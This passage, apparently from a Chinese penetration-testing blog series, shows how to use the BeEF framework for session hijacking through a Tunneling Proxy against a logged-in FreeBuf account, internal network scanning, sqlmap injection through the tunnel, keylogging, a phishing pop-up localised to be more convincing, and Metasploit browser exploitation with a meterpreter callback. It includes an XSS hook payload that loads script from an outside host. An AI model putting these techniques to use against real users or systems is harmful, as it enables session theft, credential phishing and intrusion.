<p>上面就是浏览器代理的基本原理，实际的过程要复杂的多（主要是转换成ajax请求的过程要复杂些），单单看原理可能很难理解它究竟有什么作用。下面给个例子，笔者强烈推荐读者也实际操作一次。</p>
<p>下面是测试环境：</p>
<p>本次测环境依旧是kali系统，而且需要使用到三个不同的浏览器。笔者使用 firefox 的 -P 选项创建了三个不同profile的浏览器，它们三个相互之间是不会共享数据的。</p>
<table>
<thead>
<tr>
<th style="text-align:left">浏览器</th>
<th style="text-align:left">作用</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left">浏览器A</td>
<td style="text-align:left">登录BeEF服务器。</td>
</tr>
<tr>
<td style="text-align:left">浏览器B</td>
<td style="text-align:left">作为受害者， 且登录了Freebuf网站。</td>
</tr>
<tr>
<td style="text-align:left">浏览器C</td>
<td style="text-align:left">作为攻击者，通过Tuneling proxy来窃取浏览器B的会话。</td>
</tr>
</tbody>
</table>
<p>开启BeEF服务器， 接着使用浏览器A登录BeEF服务器。</p>
<p>使用浏览器B访问Freebuf网站，接着登录。然后返回首页，使用Burp Suite截取返回的数据，并在里面注入勾子。</p>
<p>这时的浏览器B如下图，笔者已经登录，并且这个页面已经注入了勾子：</p>
<p><img src="/img/posts/15309700021437.png" alt="1.png"></p>
<p>浏览器B的任务已经结束了，从现在开始到测试结束，只要一直保持这个样子就可以了。</p>
<p>这时的浏览器A如下图，可以看到浏览器B已经被钩住了：</p>
<p><img src="/img/posts/15309706881224.png" alt="2.png"></p>
<p>开启Tunneling Proxy，在kali中默认开启Tunneling Proxy功能。如果是自主安装BeEF，需要开启，配置文件是beef目录的extensions/proxy/config.yaml。确保有下图的设置， 修改后重启BeEF：</p>
<p><img src="/img/posts/1530972053201.png" alt="3.png"></p>
<p>开启了Tunneling Proxy功能之后，接着是选择一个被勾连的浏览器做为代理。在这个例子中自然是选择被钩住的浏览器B。在浏览器A中，点击左上方的主机，然后点击右键，选择Use as Proxy。</p>
<p><img src="/img/posts/15309725011240.png" alt="4.png"></p>
<p>这样BeEF所在主机(在这个例子中，主机就是127.0.0.1)的6789端口就是一个代理了，而它会把数据传给浏览器B，浏览器B也成了一个代理，只是这个代理有点特殊。</p>
<p>现在到浏览器C出场了，先给浏览器C设置代理。</p>
<p><img src="/img/posts/153097344791.png" alt="5.png"></p>
<p>都设置好了以后，看看有什么效果。这时使用浏览器C访问Freebuf主页看看， 会有如下图的效果：</p>
<p><img src="/img/posts/15309740292212.png" alt="7.png">虽然图片和一些js没有加载成功，导致排版有些问题。但还是可以看到浏览器C通过Tunneling Proxy窃取了浏览器B中的会话。</p>
<p>现在来解决一下图片下载问题。 通过查看BeEF管理页面（浏览器A）中Tunneling Proxy的历史，可以找到问题所在：</p>
<p><img src="/img/posts/15309749366624.png" alt="8.png"></p>
<p>可以看到freebuf把一些静态的文件都放在了 static.3001.net这个域下。当勾子操作着浏览器B向这个域发送AJAX请求，浏览器B接收到响应，响应中的首部没有设置。</p>
<figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Access</span>-Control-Allow-Origin: *</span><br></pre></td></tr></table></figure>
<p>由于同源策略的限制，所以勾子无法读取响应。 导致了出现了错误。</p>
<p>一般情况下图片、CSS、js等静态文件是不会受同源策略的限制。但是这里是因为由勾子的js代码发出的AJAX请求，所以才会受SOP的限制。</p>
<p>知道了问题所在，那么解决办法也就简单了。既然是static.3001.net这个域的静态文件无法返回，那么只要设置freebuf.com这个域走代理，其它域都不走代理就可以了。写一个proxy1.pac文件，内容如下：</p>
<figure class="highlight qml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">FindProxyForURL</span>(<span class="params">url, host</span>) </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (shExpMatch(<span class="built_in">url</span>, <span class="string">"*freebuf.com/*"</span>)) &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="string">'PROXY 127.0.0.1:6789'</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="string">'DIRECT'</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>上面pac文件会告诉firefox，只有访问freebuf.com这个域或其子域的时候才会走127.0.0.1:6789这个代理。</p>
<p>接下来设置浏览器C使用pac自动代理：</p>
<p><img src="/img/posts/15310046608965.png" alt="10.png"></p>
<p>好了，现在来看看效果如何，再一次使用浏览器C来访问freebuf：</p>
<p><img src="/img/posts/15310055176982.png" alt="11.png"></p>
<p>这次效果就好多了， 浏览器C已经成功窃取了浏览器B的会话。这时的浏览器B还是保持着它原来的样子（在freebuf的首页，也就是上面的第一张图），它无法察觉它的会话已被窃取。下面来看看窃取到的会话还可以做些什么操作。</p>
<p><img src="/img/posts/15310070056853.png" alt="12.png"></p>
<p><img src="/img/posts/15310070506255.png" alt="15.png"></p>
<p><img src="/img/posts/15310070864688.png" alt="13.png"></p>
<p><img src="/img/posts/15310071037583.png" alt="14.png"></p>
<p>可以看到只要是同源的情况下，都可以使用窃取来的会话进行操作，异源就不行了。这里可以看到Freebuf各子域之间的并没有使用CORS来允许交互。</p>
<p>测试一下退出的操作，发现能成功。浏览器C执行退出操作后，浏览器B的会话也会失效。</p>
<p><img src="/img/posts/15310073595445.png" alt="16.png"></p>
<p>测试到这里就结束了，现在来回顾一下整一个过程。首先，我们让浏览器B作为一个代理，而能和浏览器B交互的只有BeEF的服务器，所以在BeEF服务器的主机下的6789端口也被设置成了一个代理。这样Tunneling Proxy就形成了，而攻击者可以使用浏览器来走这个代理（上面例子是使用了浏览器C）。浏览器C发出的请求会走过BeEF服务器，再到浏览器B，最后送到Freebuf网站。我们可以忽略中间的过程，只关注从浏览器B哪里发出的请求。从这里发出请求是由浏览器B中勾子发出的AJAX请求，所以浏览器B会把Freebuf站点上的Cookies也一起放到请求中，对于浏览器B来说这个AJAX请求只不过是一个对Freebuf网站正常请求。这就是能窃取会话的原因，至始至终浏览器C和BeEF服务器都没有获得过Freebuf站点上关于用户会话的Cookies。因为设置了HttpOnly，所以js代码是无法访问的。</p>
<h3 id="Tunneling-Proxy-的优缺点"><a href="#Tunneling-Proxy-的优缺点" class="headerlink" title="Tunneling Proxy 的优缺点"></a>Tunneling Proxy 的优缺点</h3><p>先说优点：</p>
<p>第一它可以无视HttpOnly的限制，成功的窃取会话。</p>
<p>第二它开启了一个代理隧道，那么就可以使用Burp和Sqlmap这些工具， 下一章会介绍。</p>
<p>缺点：</p>
<p>第一是隧道的生存时间不稳定，一旦勾子失效（用户关闭被钩住的页面或者关闭被钩住的浏览器等），那么隧道就会断了。所以要使用上一章说道的技术来尽可能维持控制。</p>
<p>第二是SOP的限制，像上面的例子。即便窃取了会话，但由于SOP的限制，无法做出过多的操作。所以Tunneling Proxy如果能和绕过SOP的技术一起使用，无疑可以让攻击面变大。</p>
<h3 id="Tunneling-Proxy-的防御"><a href="#Tunneling-Proxy-的防御" class="headerlink" title="Tunneling Proxy 的防御"></a>Tunneling Proxy 的防御</h3><p>防御Tuneling Proxy就需要从根本下手，Tunneling Proxy能建立成功，是因为勾子的代码能执行成功。所以只需要使用CSP来限制这种跨域的脚本就可以了。</p>
<h2 id="攻击网络"><a href="#攻击网络" class="headerlink" title="攻击网络"></a>攻击网络</h2><p>攻击Web应用有一些技术需要使用到攻击网络的技术，所以就先介绍攻击网络。这里的攻击网络一般是指攻击内网。想象一下这样的场景：当一个公司内部网络的浏览器被BeEF勾住了，那么可不可以使用它来攻击这个内部网络呢？比如主机扫描，端口扫描。答案是可以的。攻击网络的模块在Network和Host目录。</p>
<p>攻击网络一般有这几步：</p>
<blockquote>
<ol>
<li><p>识别目标</p>
</li>
<li><p>ping sweep</p>
</li>
<li><p>扫描端口</p>
</li>
</ol>
</blockquote>
<h3 id="识别目标"><a href="#识别目标" class="headerlink" title="识别目标"></a>识别目标</h3><p>识别目标分为两个，一个是识别勾连浏览器的内部IP，另一个是识别勾连浏览器的子网。</p>
<p>BeEF给出了两个攻击模块来识别勾连浏览器的内部IP：Get Internal IP(Java) 与 Get Internal IP WebRTC。两个模块都在Host目录。 一个是使用Java技术， 一个是使用了WebRTC技术。现在已经很少有人会在浏览器中使用Java了。 使用WebRTC会更好些：</p>
<p><img src="/img/posts/15315663656925.png" alt="30.png"></p>
<p>识别勾连浏览器的子网只有一个模块：identity LAN Subnets。 这个模块的原理是通过向一些常见的子网段的主机发送XMLHttpRequest请求，然后看看响应的时间，如果主机是活动的，那么响应时间会很短。</p>
<p><img src="/img/posts/15315672138410.png" alt="31.png"></p>
<p>这个模块所扫描的子网段是设置好的，可以在 beef主目录/modules/network/identify_lan_subnets/command.js文件中增加。</p>
<h3 id="ping-sweep"><a href="#ping-sweep" class="headerlink" title="ping sweep"></a>ping sweep</h3><p>知道内网ip 或 目标子网段后，下一步就是查看一下子网中有那些主机是活动的。BeEF为此提供了Ping Sweep 模块,它的原理和identify_lan_subnets一样。</p>
<p><img src="/img/posts/15315928813086.png" alt="33.png"></p>
<p>下面是笔者的扫描结果：</p>
<p><img src="/img/posts/15315929149982.png" alt="34.png"></p>
<h3 id="扫描端口"><a href="#扫描端口" class="headerlink" title="扫描端口"></a>扫描端口</h3><p>知道活动主机以后，那么接下来就是进行端口扫描。BeEF提供了 Port Sanner 模块来达成这一目的，其原理是使用IMG标签和自定义的onload/onerrer事件处理程序， 以及计时器。但是现代的浏览器都实现了端口封禁，端口封禁限制了浏览器对某些端口发送http请求，比如 21, 22, 25, 110, 145 等端口， 所以一般无法扫描出这些端口。</p>
<p><img src="/img/posts/15315940208499.png" alt="35.png"></p>
<p>下面是扫描结果</p>
<p><img src="/img/posts/15315940578300.png" alt="36.png"></p>
<h2 id="攻击Web应用"><a href="#攻击Web应用" class="headerlink" title="攻击Web应用"></a>攻击Web应用</h2><p>想象一下两个的情景。</p>
<p>第一个，一家公司的内网用户使用浏览器访问了某个有勾子的外网网站页面（可能是xss等漏洞导致），BeEF在获得了浏览器的控制权后，能不能进一步攻击这家公司的一些内网的Web呢？</p>
<p>第二个场景，某个网站的“给网站提出意见”或者“广告招租”等功能有存储型XSS漏洞，且提交上去的数据只有后台人员才能看到，该站点的所有Cookie都会设置HttpOnly，但是后台的某个功能存在着SQL漏洞，那么能否使用SQLmap通过BeEF来进行SQL注入来获取数据或者更进一步直接获取Webshell呢？</p>
<p>上面的两个问题，答案都是可以做到的。从上面的两个场景，可以看出要使用BeEF攻击Web应用主要分为两个种类型。第一种是攻击不同源的Web，对应着第一个场景。第二种是攻击同源的Web，对应着场景二。下面分开来讨论。</p>
<h3 id="攻击不同源Web应用"><a href="#攻击不同源Web应用" class="headerlink" title="攻击不同源Web应用"></a>攻击不同源Web应用</h3><p>先来说说攻击不同源Web的原理。从上一章，读者应该能理解到，BeEF可以让被勾住的浏览器向任何域发送HTTP请求。只是在发送跨域时，多数情况下SOP都会阻止浏览器读取HTTP响应。虽然不能读取HTTP响应,但有些攻击是不需要读取的，典型的不需要读取HTTP响应的攻击技术就是CSRF了。</p>
<p>要攻击不同源的Web应用，首先要对它进行充足的侦查。可以利用上面攻击网络的技术来检测一下勾连浏览器的内网有那些Web服务器。当我们知道那个内网主机上是Web服务器，接下来我们要对它进行指纹采集。前几章有提到js，css，图片的静态文件一般不会受SOP限制。而这正是指纹采集的关键，我们可以通过一些已知的静态资源来推测出目标。比如向一个内网的主机请求一个 /icon/apache_pb.gif图片，如果这个主机返回了图片数据，那么这个主机有可能运行着apache。</p>
<p>BeEF给出了两个指纹采集的攻击模块，分别是Get HTTP Servers(Favicon) 和 Fingerprint Local Network。两个模块的原理都是一样的，通过在勾连浏览器中创建一个不可见的IFrame，然后添加一个<img>标签，并设置onload/onerror事件，如果成功加载了图片触发了onload事件，那么就可以根据这个图片来推断出是什么服务器。Get HTTP Servers（Favicon）只会断定加载了那个图片，而Fingerprint Local Network 会计算加载的图片的长宽，然后和数据库对比，最后判断出这是个什么服务器。</p>
<p>下面是笔者用两个模块对内网中metasploitable2 的作出的测试结果：</p>
<p>Get HTTP Servers（Favicon）</p>
<p><img src="/img/posts/15316683203880.png" alt="37.png"></p>
<p>Fingerprint Local Network</p>
<p><img src="/img/posts/15316683859004.png" alt="38.png"></p>
<p>作出基本的指纹检测后，如果目标是有漏洞了，比如有一台Jboss 6.0.0， 那么就可以使用Jboss 6.0.0M1 JMX Deploy Exploit 模块直接反弹一个meterpreter回来。除了这个漏洞，BeEF也提供了一些CSRF的攻击模块可以使用。由于篇幅原因，这里就不测试了，有兴趣的可以自己搭环境测试。</p>
<h3 id="攻击同源Web应用"><a href="#攻击同源Web应用" class="headerlink" title="攻击同源Web应用"></a>攻击同源Web应用</h3><p>攻击不同源的Web应用是有点鸡肋的，必须要满足不少条件才行。但是攻击同源Web应用就相对简单且有效的多。</p>
<p>上面的场景二，某个网站的“给网站提出意见”或者“广告招租”等功能有存储型XSS漏洞，且提交上去的数据只有后台人员才能看到，该站点的所有Cookie都会设置HttpOnly，但是后台的某个功能存在着SQL漏洞。我们要使用SQLmap通过BeEF来进行SQL注入来获取数据或者更进一步直接获取Webshell。这里就要用到上一章讲到的 Tunneling Proxy了。</p>
<p>因为没有好的靶子机，这里使用metasploitabel2来做测试了，下面是测试环境：</p>
<table>
<thead>
<tr>
<th style="text-align:left">名称</th>
<th style="text-align:left">角色</th>
<th style="text-align:left">ip</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left">Ubuntu</td>
<td style="text-align:left">BeEF服务器</td>
<td style="text-align:left">外网</td>
</tr>
<tr>
<td style="text-align:left">kali</td>
<td style="text-align:left">攻击者，sqlmap</td>
<td style="text-align:left">外网</td>
</tr>
<tr>
<td style="text-align:left">Windows7 / 浏览器A</td>
<td style="text-align:left">受害者</td>
<td style="text-align:left">内网 10.0.2.4</td>
</tr>
<tr>
<td style="text-align:left">metasploitable2</td>
<td style="text-align:left">内网有漏洞的主机</td>
<td style="text-align:left">内网 10.0.2.5</td>
</tr>
<tr>
<td style="text-align:left"></td>
<td style="text-align:left"></td>
</tr>
</tbody>
</table>
<p>笔者使用最新的BeEF来测试，BeEF装好后，需要改一下config.yaml中的登录密码，要使用强密码，否则BeEF会在每次启动时给你分配一个随机密码。笔者测试时，发现最新版有一些Bug，导致proxy功能不太好用。经过调试，找到了Bug所在。修改一下beef/extensions/proxy/proxy.rb文件：</p>
<p><img src="/img/posts/15322598225177.png" alt="1.png">修改成红线的两处的path就可以了。运行BeEF， 接着在windows7中用浏览器A访问metasploitable2 的dvwa。 把dvwa的安全调为低，接着使用xss reflected 来注入BeEF的钩子：</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"http://BeEF_ip:3000/hook.js"</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p><img src="/img/posts/15322601195001.png" alt="2.png"></p>
<p>接下来在kali中登录BeEF服务器的管理UI，把浏览器A设置为Tunneling Proxy(参照上一章的方法)。</p>
<p>设置完后，在kali中运行sqlmap，使用–proxy选项，走BeEF的Tunneling Proxy:</p>
<p><img src="/img/posts/15322606595130.png" alt="3.png"></p>
<p>下面时结果图：</p>
<p><img src="/img/posts/15322607274538.png" alt="4.png"></p>
<p>在使用sqlmap走BeEF隧道时，建议不要使用 –technique=T， 因为在走隧道时也会消耗时间，所以注入结果会不准确。 </p>
<p>这里只演示了sqlmap， 实际上burp也是可以走BeEF隧道了。这里旧不进行演示了，有兴趣的朋友可以自己玩。</p>
<h2 id="攻击用户"><a href="#攻击用户" class="headerlink" title="攻击用户"></a>攻击用户</h2><p>攻击用户可分为三部分：内容劫持、捕获用户输入、社会工程学。</p>
<h3 id="内容劫持"><a href="#内容劫持" class="headerlink" title="内容劫持"></a>内容劫持</h3><p>内容劫持是指替换被勾连的浏览器中当前页面内容，比如替换被勾连的浏览器中当前页面中所有的&lt;a&gt;元素的href。</p>
<p>BeEF自带了很多内容劫持相关的攻击模块：</p>
<p><img src="/img/posts/1532859774_5b5d957e0ce6e.png" alt="攻击模块"></p>
<p>上图中Get xxx系列的攻击模块就是简单获取xxx，比如Get Cookie 就是获取勾连浏览器当前页面的Cookie，Get Form Values 就是获取From表单中值。Replace HREFs系列就是替换所有&lt;a&gt;元素中的HREF属性，比如常用的Replace HREFs是循环替换所有&lt;a&gt;元素的HREF属性，Replace HREFs(Click Events)和Replace HREFs类似，唯一的区别是只有onClick 事件发生时才触发修改HREF属性。Replace HREFs(HTTPs)是把所有指向https站点的链接改写为http协议。Redirect Browser模块是把被勾连的浏览器重定向到指定的页面。Replace Content（Deface）是直接修改页面的内容。这些功能可以窃取一些内容，也可以配合钓鱼网站来攻击用户。</p>
<h3 id="捕获用户输入"><a href="#捕获用户输入" class="headerlink" title="捕获用户输入"></a>捕获用户输入</h3><p>捕获用户的输入也就是我们常说的键盘记录器，BeEF通过使用焦点事件，键盘事件，鼠标和指针事件这四个事件来实时监控着用户的操作。其中焦点事件是指用户的焦点是否还在被勾连的页面，下面笔者在一个被勾连的浏览器中分别触发四个事件：</p>
<p><img src="/img/posts/1532861590_5b5d9c96403f6.png" alt="分别触发四个事件"></p>
<p>然后来看看BeEF中实时的返回：</p>
<h3 id><a href="#" class="headerlink" title></a><img src="/img/posts/1532861632_5b5d9cc05a0dc.png" alt="实时的返回"></h3><h3 id="社会工程学-1"><a href="#社会工程学-1" class="headerlink" title="社会工程学"></a>社会工程学</h3><p>BeEF有一个目录，里面是专门用于社会工程学的攻击模块：</p>
<p><img src="/img/posts/1532863095_5b5da277111ec.png" alt="用于社会工程学的攻击模块"></p>
<p>这里笔者挑Pretty Theft（完美盗窃）来演示， 演示环境是上一章演示攻击Web应用时用到的metasploitable2 dvwa + BeEF + kali。</p>
<table>
<thead>
<tr>
<th style="text-align:left">名称</th>
<th style="text-align:left">角色</th>
<th style="text-align:left">ip</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left">Ubuntu</td>
<td style="text-align:left">BeEF服务器 / metasploit</td>
<td style="text-align:left">外网</td>
</tr>
<tr>
<td style="text-align:left">kali</td>
<td style="text-align:left">攻击者</td>
<td style="text-align:left">外网</td>
</tr>
<tr>
<td style="text-align:left">Windows7 / 浏览器A</td>
<td style="text-align:left">受害者</td>
<td style="text-align:left">内网 10.0.2.4</td>
</tr>
<tr>
<td style="text-align:left">metasploitable2</td>
<td style="text-align:left">内网有漏洞的主机</td>
<td style="text-align:left">内网 10.0.2.5</td>
</tr>
</tbody>
</table>
<p>Pretty Theft 攻击模块会在被勾连浏览器上弹出一个弹框，然后通过欺骗性的语句来使用户输入帐号和密码。当网站有http-only这个响应首部，无法窃取cookie时，可以使用完美盗窃这个模块来窃取用户的帐号和密码。</p>
<p>使用Pretty Theft前，需要做一些参数的设置：</p>
<p><img src="/img/posts/1532869698_5b5dbc42cf0c8.png" alt="参数设置"></p>
<p>点击Execute运行， 被勾连的浏览器会有一个提示性的弹框弹出：</p>
<p><img src="/img/posts/1532869772_5b5dbc8c53311.png" alt="提示性的弹框"></p>
<p>如果用户输入帐号和密码：</p>
<p><img src="/img/posts/1532869811_5b5dbcb33c69a.png" alt="输入帐号和密码"></p>
<p>那么在BeEF的管理UI上就能看到了帐号和密码：</p>
<p><img src="/img/posts/1532870067_5b5dbdb3a76ec.png" alt="看到帐号和密码"></p>
<p>读者可能注意到了，Pretty Theft默认下弹出的诱惑性弹框中所使用的语言是英文。在国内效果肯定要打折扣了。所以要修改一下，在beef/modules/social_engineering/pretty_theft/command.js中修改：</p>
<p><img src="/img/posts/1532870373_5b5dbee51777d.png" alt="修改文件"></p>
<p>修改后的效果如下：</p>
<p><img src="/img/posts/1532870567_5b5dbfa749c74.png" alt="修改后的效果"></p>
<p>样貌有点不太好看，主要是因为logo太大了，如果读者懂得js和html，那么你也可以在beef/modules/social_engineering/pretty_theft/command.js中自己定制一个好看一些的。这样可信度就会提高很多了。</p>
<p>除了pretty_theft外还有一些社会工程学的攻击模块，这些就留给读者自行测试了。</p>
<h2 id="攻击浏览器"><a href="#攻击浏览器" class="headerlink" title="攻击浏览器"></a>攻击浏览器</h2><p>攻击浏览器的技术，笔者只介绍一个：联合metasploit来攻击浏览器。演示的环境与上面演示pretty_theft是一样的。</p>
<p>要使用Metasploit + BeEF之前，需要做一下设置。</p>
<p>首先要在BeEF中修改beef/extensions/metasploit/config.yaml配置文件：</p>
<p><img src="/img/posts/1533975989_5b6e9db507d4e.png" alt="修改配置文件"></p>
<p>上图中的port, user, pass 需要与下面在msf中启动MSGRPC接口中的port, user, pass一样。而图中最下面的”{os: ‘custom’, path:’/opt/metasploit-framework/’}”要根据实际情况来改，这里写的是msf的路径，这里笔者是在Ubuntu中安装了msf，所以路径是/opt/metasploit-framework/, 如果读者是使用kali来测试，那么默认已经有写路径了。</p>
<p>接着修改beef/config.yaml, 设置开启metasploit模块：</p>
<p><img src="/img/posts/1533433798_5b6657c6020bb.png" alt="开启metasploit模块"></p>
<p>设置好BeEF后，现在来开启Metasploit的MSGRPC接口， 先在一个空白文件msf_beef.txt中写入：</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">load msgrpc <span class="attribute">ServerHost</span>=127.0.0.1 <span class="attribute">ServerPort</span>=xxxx <span class="attribute">User</span>=msf <span class="attribute">Pass</span>=xxxxx</span><br></pre></td></tr></table></figure>
<p>ServerPort, User, Pass 需要与BeEF中设置的一样。 接着启动msf服务器， 因为笔者是在远程的服务器上启动msf的，而且msf必需保持运行状态，所以笔者使用screen命令来启动msf。这样即使我关闭了ssh连接，也可以保证msf保持运行状态：</p>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">screen -S msf   <span class="comment">//创建一个名为msf的session</span></span><br><span class="line">msfconsole -r msf_beef<span class="selector-class">.txt</span>    <span class="comment">//启动msf，并启动msgrpc接口</span></span><br></pre></td></tr></table></figure>
<p>启动成功后，会有如下图的输出：</p>
<p><img src="/img/posts/1533434634_5b665b0a8b2f9.png" alt="输出结果截图"></p>
<p>接着按住Ctrl键 + a + d， 暂时离开”msf” session窗口， 回到原本的窗口。 这样即使退出了ssh连接， “msf”session还是会在继续运行。</p>
<figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">screen</span>  -ls   <span class="comment">//可以看到当前有多少个session窗口在运行</span></span><br><span class="line"><span class="keyword">screen</span>  -r  id  <span class="comment">//可以进入到 某个session窗口</span></span><br></pre></td></tr></table></figure>
<p>启动了msfconsole之后，  就可以启动BeEF了。这个顺序不能反了，需要先启动msfconsole，才能启动BeEF。</p>
<figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nohup ./beef <span class="meta">&amp;</span></span><br></pre></td></tr></table></figure>
<p>现在环境设置好了。 说一下BeEF + msf攻击原理， 原本如果只是使用metasploit 来攻击浏览器（这里是IE8），那么metasploit会生成一个URL，如果IE访问了这个URL，那么就会中招。</p>
<p><img src="/img/posts/1533977137_5b6ea231ea3b9.png" alt="中招"></p>
<p>现在有BeEF， BeEF可以把metasploit生成的URL嵌入到被勾连浏览器的一个iframe中。通过msgrpc接口，可以直接在BeEF的管理UI中设置metasploit的参数并直接使用msf的exploit模块。</p>
<p><img src="/img/posts/1533979145_5b6eaa09ae520.png" alt="使用msf的exploit模块"></p>
<p>这里笔者挑了ms11_003_ie_css_import来做测试 ， 在BeEF的metaspliot 目录下可以找到。 设置好参数之后点击Execute就可以运行了。</p>
<p>回到Ubuntu服务器， 查看msfconsole控制台：</p>
<p><img src="/img/posts/1533979551_5b6eab9f12740.png" alt="查看msfconsole控制台"></p>
<p>可以看到回连了meterpreter。在测试的时候，要确保网络的速度， 笔者因为网速问题，测了好几次才成功。</p>

    </div>
    
    <div class="post-footer">
        <div>
            
                转载声明：商业转载请联系作者获得授权,非商业转载请注明出处 © <a href="/" target="_blank">Ljjyy.com</a>
            
        </div>
        <div>
            
        </div>
    </div>
</article>

<div class="article-nav prev-next-wrap clearfix">
    
        <a href="/archives/2019/01/100156.html" class="pre-post btn btn-default" title='Kali linux渗透测试之 六.权限提升'>
            <i class="fa fa-angle-left fa-fw"></i><span class="hidden-lg">上一篇</span>
            <span class="hidden-xs">Kali linux渗透测试之 六.权限提升</span>
        </a>
    
    
        <a href="/archives/2019/01/100154.html" class="next-post btn btn-default" title='Kali linux渗透测试之 四.漏洞映射'>
            <span class="hidden-lg">下一篇</span>
            <span class="hidden-xs">Kali linux渗透测试之 四.漏洞映射</span><i class="fa fa-angle-right fa-fw"></i>
        </a>
    
</div>


    <div id="comments">
        
	
    <div id="vcomments" class="valine"></div>
    <script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
<script src="/assets/valine.min.js"></script>

    <script>
        new Valine({
            av: AV,
            el: '#vcomments',
            appId: '5MzTXYXkt03k101j0PmSDN34-gzGzoHsz',
            appKey: 'iwjYgwno6qj3wtDVVSbe8nYQ',
            placeholder: '说点什么吧',
            notify: false,
            verify: true,
            avatar: 'mm',
            meta: 'nick,mail'.split(','),
            pageSize: '10',
            path: window.location.pathname,
            lang: 'zh-CN'.toLowerCase()
        })
    </script>


    </div>





                </main>
                
                    <aside id="article-toc" role="navigation" class="col-md-4">
    <div class="widget">
        <h3 class="title">文章目录</h3>
        
            <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#一-服务器端攻击"><span class="toc-text">一. 服务器端攻击</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#漏洞评估"><span class="toc-text">漏洞评估</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#（1）Skipfish"><span class="toc-text">（1）Skipfish</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#（2）ProxyStrike"><span class="toc-text">（2）ProxyStrike</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#（3）Vega"><span class="toc-text">（3）Vega</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#（4）OWASP-ZAP"><span class="toc-text">（4）OWASP ZAP</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#（5）WebSploit"><span class="toc-text">（5）WebSploit</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#漏洞利用"><span class="toc-text">漏洞利用</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#利用电子邮件系统的漏洞"><span class="toc-text">利用电子邮件系统的漏洞</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#暴力破解攻击"><span class="toc-text">暴力破解攻击</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#破解密码"><span class="toc-text">破解密码</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#中间人攻击"><span class="toc-text">中间人攻击</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#二-客户端攻击"><span class="toc-text">二. 客户端攻击</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#客户端攻击"><span class="toc-text">客户端攻击</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#社会工程"><span class="toc-text">社会工程</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#获取和破解用户密码"><span class="toc-text">获取和破解用户密码</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Kali中的密码破解工具"><span class="toc-text">Kali中的密码破解工具</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Kali中的其他可用工具"><span class="toc-text">Kali中的其他可用工具</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#三-Web攻击"><span class="toc-text">三. Web攻击</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#浏览器漏洞利用框架：BeEF"><span class="toc-text">浏览器漏洞利用框架：BeEF</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#FoxyProxy（fireFox插件）"><span class="toc-text">FoxyProxy（fireFox插件）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Burp代理"><span class="toc-text">Burp代理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#OWASP-ZAP"><span class="toc-text">OWASP ZAP</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Set"><span class="toc-text">Set</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Fimap"><span class="toc-text">Fimap</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#拒绝服务工具（DDOS）"><span class="toc-text">拒绝服务工具（DDOS）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#其他工具"><span class="toc-text">其他工具</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#四-数据库攻击"><span class="toc-text">四. 数据库攻击</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#五-身份认证攻击"><span class="toc-text">五. 身份认证攻击</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#身份认证"><span class="toc-text">身份认证</span></a></li><li 